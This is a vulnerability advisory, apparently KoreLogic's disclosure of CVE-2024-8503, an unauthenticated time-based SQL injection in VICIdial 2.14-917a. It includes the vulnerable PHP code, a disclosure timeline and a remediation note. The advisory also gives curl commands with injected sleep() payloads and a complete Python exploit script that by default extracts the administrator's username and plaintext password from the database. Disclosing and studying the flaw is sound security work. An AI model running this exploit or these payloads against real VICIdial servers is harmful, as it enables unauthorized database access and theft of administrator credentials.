@@ -1,0 +1,409 @@
+id: 39746
+date: 09/11/2024
+title: VICIdial 2.14-917a SQL Injection Vulnerability
+author: Jaggar Henry
+cves: CVE-2024-8503
+
+Title: VICIdial Unauthenticated SQL Injection
+Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2024-011.txt
+
+
+1. Vulnerability Details
+
+      Affected Vendor: VICIdial
+      Affected Product: VICIdial
+      Affected Version: 2.14-917a
+      Platform: GNU/Linux
+      CWE Classification: CWE-89: Improper Neutralization of Special
+                          Elements used in an SQL Command
+                          ('SQL Injection')
+      CVE ID: CVE-2024-8503
+
+
+2. Vulnerability Description
+
+      An unauthenticated attacker can leverage a time-based SQL
+      injection vulnerability in VICIdial to enumerate database
+      records. By default, VICIdial stores plaintext credentials
+      within the database.
+
+
+3. Technical Description
+
+      VICIdial is an open-source contact center suite, mainly used
+      by call centers. The "vicidial.com" website boasts over 14,000
+      registered installations. There is a public SVN repository to
+      access the source code, as well as an ISO that can be used to
+      install the software. The ISO was used in a virtual machine
+      for testing purposes.
+
+      When performing SQL queries, VICIdial does not use prepared
+      statements, but instead uses the "preg_replace" PHP function
+      to remove problematic characters in user-controlled input
+      before interpolating the variable into a SQL query. This
+      is largely an effective solution, as regular expressions
+      like "/[^-_0-9a-zA-Z]/" are passed to "preg_replace", which
+      essentially limits input to the characters shown in the pattern
+      (letters, numbers, underscores, and hyphens).
+
+      However, these scripts do not utilize a shared PHP file
+      for performing sanitization uniformly. Instead, each script
+      individually implements the "preg_replace" function, leading
+      to inconsistencies in which patterns are used and where they
+      are applied.
+
+      For example, providing credentials via the "Authorization"
+      request header using the "Basic" scheme, most PHP scripts
+      sanitize the username value with the following line:
+
+     $PHP_AUTH_USER = preg_replace('/[^-_0-9a-zA-Z]/','',$PHP_AUTH_USER);
+
+      However, the "VERM_AJAX_functions.php" PHP script does not
+      perform any sanitization before inserting the username into
+      a SQL "INSERT" statement:
+
+     $PHP_AUTH_USER=$_SERVER['PHP_AUTH_USER'];
+     $PHP_AUTH_PW=$_SERVER['PHP_AUTH_PW'];
+     ...
+     if ($function=="log_custom_report")
+       {
+       $rpt_log_stmt="insert ignore into
+         verm_custom_report_holder(user,
+         report_name, report_parameters)
+         values('$PHP_AUTH_USER', '$custom_report_name',
+         '$LOGhttp_referer') ON DUPLICATE KEY
+         UPDATE report_name='$custom_report_name',
+         report_parameters='$custom_report_vars'";
+       $rpt_log_rslt=mysql_to_mysqli($rpt_log_stmt, $link);
+       return mysqli_affected_rows($rpt_log_rslt);
+       }
+
+      Since "VERM_AJAX_functions.php" can be accessed without
+      authentication, this creates a straight forward unauthenticated
+      SQL injection vulnerability. While the page response cannot
+      be manipulated by the execution of the query, delays in the
+      page response can be observed when using SQL functions such as
+      "sleep()", enabling the enumeration of database values using
+      time-based SQL injection:
+
+     $ time curl -u "foo:bar" \
+  http://REDACTED/VERM/VERM_AJAX_functions.php?function=log_custom_report
+
+     real    0m0.019s   <--- (normal response time)
+     user    0m0.004s
+     sys    0m0.008s
+
+     $ time curl -u "','',sleep(5));#:bar" \
+  http://REDACTED/VERM/VERM_AJAX_functions.php?function=log_custom_report
+
+     real    0m5.023s   <--- (5-second delay in response time)
+     user    0m0.003s
+     sys    0m0.008s
+
+      This observable difference can be used to craft queries that
+      sleep under specific conditions, allowing an attacker to ask
+      "Yes or No" questions. In the following example, the "sleep()"
+      function is called only if the provided string matches the
+      database version:
+
+     $ time curl -u \
+         "','',IF(@@version='korelogic',sleep(5),NULL));#:bar" \
+  http://vicidial.zz/VERM/VERM_AJAX_functions.php?function=log_custom_report
+
+     real    0m0.024s   <--- (normal response time)
+     user    0m0.006s
+     sys    0m0.003s
+
+     $ time curl -u \
+  "','',IF(@@version='10.6.14-MariaDB-log',sleep(5),NULL));#:bar" \
+  http://vicidial.zz/VERM/VERM_AJAX_functions.php?function=log_custom_report
+
+     real    0m5.019s   <--- (5-second delay in response time)
+     user    0m0.004s
+     sys    0m0.008s
+
+
+4. Mitigation and Remediation Recommendation
+
+      This issue has been remediated in the public svn/trunk codebase,
+      as of revision 3848 committed 2024-07-08.
+
+
+5. Credit
+
+      This vulnerability was discovered by Jaggar Henry of KoreLogic,
+      Inc.
+
+
+6. Disclosure Timeline
+
+      2024-07-05 : KoreLogic requests security contact from
+                   support@vicidial.com.
+      2024-07-08 : KoreLogic reports vulnerability details to VICIdial
+                   contact.
+      2024-07-08 : VICIdial notifies KoreLogic that the issue has been
+                   remediated with revision 3848 in the public
+                   Subversion repository.
+      2024-07-11 : KoreLogic confirms this vulnerability has been
+                   remediated. KoreLogic asks VICIdial if it is
+                   appropriate to publicly disclose the vulnerability
+                   details at this time.
+      2024-07-11 : VICIdial requests four weeks of embargo in order to
+                   upgrade supported customers.
+      2024-08-05 : KoreLogic asks VICIdial if it is appropriate to
+                   publicly disclose the vulnerability details at
+                   this time.
+      2024-08-09 : VICIdial requests an additional two weeks of
+                   embargo.
+      2024-09-10 : KoreLogic public disclosure.
+
+
+7. Proof of Concept
+
+      The following script can be used to automate the exploitation process and
+      enumerate the results of provided queries:
+
+          $ time python unauth_sqli.py -rh vicidial.zz -rp 443 -q 'SELECT @@version'
+          [+] Target appears vulnerable to time-based SQL injection
+          [~] Executing SQL: SELECT @@version
+          [~] 1
+          [~] 10
+          [~] 10.
+          [~] 10.6
+          [~] 10.6.
+          [~] 10.6.1
+          [~] 10.6.14
+          [~] 10.6.14-
+          [~] 10.6.14-M
+          [~] 10.6.14-Ma
+          [~] 10.6.14-Mar
+          [~] 10.6.14-Mari
+          [~] 10.6.14-Maria
+          [~] 10.6.14-MariaD
+          [~] 10.6.14-MariaDB
+          [~] 10.6.14-MariaDB-
+          [~] 10.6.14-MariaDB-l
+          [~] 10.6.14-MariaDB-lo
+          [~] 10.6.14-MariaDB-log
+
+          real    0m6.727s
+          user    0m0.425s
+          sys    0m0.020s
+
+
+      ##############################
+      ##      unauth_sqli.py      ##
+      ##############################
+
+      import string
+      import random
+      import urllib3
+      import argparse
+      import requests
+      from base64 import b64encode
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+      class Exploit:
+          def __init__(self, rhost, rport, proxy=None):
+              """
+              This 'sleep' duration is derived by the average response time
+              multiplied by this value. A server with an average response time
+              of 10ms is given a 'sleep' duration of 300ms. Tune as needed.
+              """
+              self.SLEEP_MULTIPLIER = 30
+              self.REQUEST_HEADERS = {'User-Agent': 'KoreLogic'}
+              self.ALLOWED_SCHEMES = ['http', 'https']
+              if proxy:
+                  self.REQUEST_PROXIES = {
+                      'http':  proxy,
+                      'https': proxy
+                  }
+              else:
+                  self.REQUEST_PROXIES = {}
+
+              self.TARGET_IP   = rhost
+              self.TARGET_PORT = rport
+
+              self.VICIDIAL_FINGERPRINT = 'Please Hold while I redirect you!'
+              self.RANDOM_CHARSET = string.ascii_uppercase + string.digits
+
+          # returns a URI with 'http' or 'https'
+          def determine_target_uri(self):
+              for scheme in self.ALLOWED_SCHEMES:
+                  target_uri = f'{scheme}://{self.TARGET_IP}:{self.TARGET_PORT}'
+                  try:
+                      response = requests.get(target_uri, headers=self.REQUEST_HEADERS, verify=False)
+                      if self.VICIDIAL_FINGERPRINT in response.text:
+                          return target_uri
+                  except:
+                      pass
+
+          # returns a session object with custom proxies/headers if supplied
+          def build_requests_session(self):
+              self.base_uri = self.determine_target_uri()
+              session = requests.Session()
+              session.proxies = self.REQUEST_PROXIES
+              session.verify  = False
+              return session
+
+          # returns a random string of a given length
+          def random(self, length):
+              return ''.join(random.choice(self.RANDOM_CHARSET) for _ in range(length))
+
+          # returns a timedelta representing the response time of an injected SQL query
+          def time_sql_query(self, query, session):
+              username    = f"goolicker', '', ({query}));# "
+              credentials = f'{username}:password'
+              credentials_base64 = b64encode(credentials.encode()).decode()
+              auth_header = f'Basic {credentials_base64}'
+
+              target_uri = f'{self.base_uri}/VERM/VERM_AJAX_functions.php'
+              request_params  = {'function': 'log_custom_report', self.random(5): self.random(5)}
+              request_headers = {**self.REQUEST_HEADERS, 'Authorization': auth_header}
+
+              response = session.get(target_uri, params=request_params, headers=request_headers)
+              return response.elapsed
+
+          # returns a boolean if time-based SQL injection is possible, additionally
+          # sets the best 'sleep' duration based on response times
+          def is_vulnerable(self, session, baseline_iterations=5):
+              # determine average baseline response time
+              zero_sleep_query = f'SELECT (NULL)'
+              total_baseline_time = 0
+              for _ in range(baseline_iterations):
+                  execution_time = self.time_sql_query(zero_sleep_query, session)
+                  total_baseline_time += execution_time.total_seconds()
+
+              average_baseline_response_time = total_baseline_time / baseline_iterations
+              self.sql_baseline_time = average_baseline_response_time
+
+              # determine if injected sleep query impacts response time
+              sleep_length = round(average_baseline_response_time * self.SLEEP_MULTIPLIER, 2)
+              sleep_query  = f'SELECT (sleep({sleep_length}))'
+              execution_time = self.time_sql_query(sleep_query, session)
+              if execution_time.total_seconds() >= sleep_length:
+                  self.sql_sleep_length = sleep_length
+                  return True
+              else:
+                  return False
+
+          # determine if a character at a specific indice of a query result returns a
+          # boolean 'true' when compared to a given character using the supplied operator
+          def check_indice_of_query_result(self, session, query, indice, operator, ordinal):
+              parent_query    = f'SELECT IF(ORD((SUBSTRING(({query}), {indice}, {indice}))){operator}{ordinal}, 
+sleep({self.sql_sleep_length}), null)'
+              execution_time  = self.time_sql_query(parent_query, session)
+              return execution_time.total_seconds() >= (self.sql_baseline_time * self.SLEEP_MULTIPLIER)
+
+          def enumerate_sql_query(self, session, query='SELECT @@version', charset=string.printable):
+              # convert charset to ordinals
+              all_characters     = sorted([ord(char) for char in charset])
+              reduced_characters = all_characters
+
+              # use a binary search and enumerate query results
+              result = ''
+              indice = 1
+              indice_could_be_null = True
+              while True:
+                  """
+                  we check if the value is NULL once per indice
+                  to determine when a string ends. this adds one
+                  request per indice, but since every boolean 'true'
+                  results in a delay this is faster than counting
+                  the length of the string before enumrating.
+                  """
+                  if indice_could_be_null:
+                      if self.check_indice_of_query_result(session, query, indice, '=', '0'):
+                          break
+                      else:
+                          indice_could_be_null = False
+
+                  # enumerate each character of query result with a binary search
+                  middle_indice  = len(reduced_characters) // 2
+                  middle_ordinal = reduced_characters[middle_indice]
+                  if self.check_indice_of_query_result(session, query, indice, '<=', middle_ordinal):
+                      if self.check_indice_of_query_result(session, query, indice, '=', middle_ordinal):
+                          reduced_characters = all_characters
+                          result += chr(middle_ordinal)
+                          indice += 1
+                          indice_could_be_null = True
+                          print(f'[~] {result}')
+                      else:
+                          reduced_characters = reduced_characters[:middle_indice]
+                  else:
+                      reduced_characters = reduced_characters[middle_indice:]
+
+              return result
+
+          # returns administrator username and password by
+          # exploiting time-based SQL injection.
+          def extract_admin_credentials(self, session):
+              print('[~] Enumerating administrator credentials')
+              username_charset = string.ascii_letters + string.digits
+              admin_username_query = "SELECT user FROM vicidial_users WHERE user_level = 9 AND modify_same_user_level = 
+'1' LIMIT 1"
+              admin_username = self.enumerate_sql_query(session, admin_username_query, username_charset)
+              print(f'[+] Username: {admin_username}')
+
+              password_charset = string.ascii_letters + string.digits + '-.+/=_'
+              admin_password_query = f"SELECT pass FROM vicidial_users WHERE user = '{admin_username}' LIMIT 1"
+              admin_password = self.enumerate_sql_query(session, admin_password_query, password_charset)
+              print(f'[+] Password: {admin_password}')
+
+              return admin_username, admin_password
+
+          # injects SQL queries and enumerates results if instance is vulnerable
+          def exploit(self, custom_query=None):
+              session = self.build_requests_session()
+              is_vulnerable = self.is_vulnerable(session)
+              if is_vulnerable:
+                  print('[+] Target appears vulnerable to time-based SQL injection')
+              else:
+                  print('[-] Failed to perform time-based SQL injection')
+                  return
+
+              if custom_query:
+                  print(f'[~] Executing SQL: {custom_query}')
+                  self.enumerate_sql_query(session, custom_query)
+              else:
+                  self.extract_admin_credentials(session)
+
+      if __name__ == '__main__':
+          argparser = argparse.ArgumentParser(description='Exploit for CVE-2024-XXXXX: Unauthenticated SQLi')
+          required  = argparser.add_argument_group('Required Arguments')
+          optional  = argparser.add_argument_group('Optional Arguments')
+          required.add_argument('-rh', '--rhost', required=True, help='Vicidial Server IP address')
+          required.add_argument('-rp', '--rport', required=True, help='Vicidial Server port number')
+          optional.add_argument('-q',  '--query', required=False, help='Custom SQL query to execute',                
+default=None)
+          optional.add_argument('-p',  '--proxy', required=False, help='HTTP[S] proxy to use for outbound requests', 
+default=None)
+          arguments = argparser.parse_args()
+
+          exploit = Exploit(
+              rhost = arguments.rhost,
+              rport = arguments.rport,
+              proxy = arguments.proxy
+          )
+          exploit.exploit(custom_query=arguments.query)
+
+
+The contents of this advisory are copyright(c) 2024
+KoreLogic, Inc. and are licensed under a Creative Commons
+Attribution Share-Alike 4.0 (United States) License:
+http://creativecommons.org/licenses/by-sa/4.0/
+
+KoreLogic, Inc. is a founder-owned and operated company with a
+proven track record of providing security services to entities
+ranging from Fortune 500 to small and mid-sized companies. We
+are a highly skilled team of senior security consultants doing
+by-hand security assessments for the most important networks in
+the U.S. and around the world. We are also developers of various
+tools and resources aimed at helping the security community.
+https://www.korelogic.com/about-korelogic.html
+
+Our public vulnerability disclosure policy is available at:
+https://korelogic.com/KoreLogic-Public-Vulnerability-Disclosure-Policy
+
+#  0day.today [2024-09-19]  #
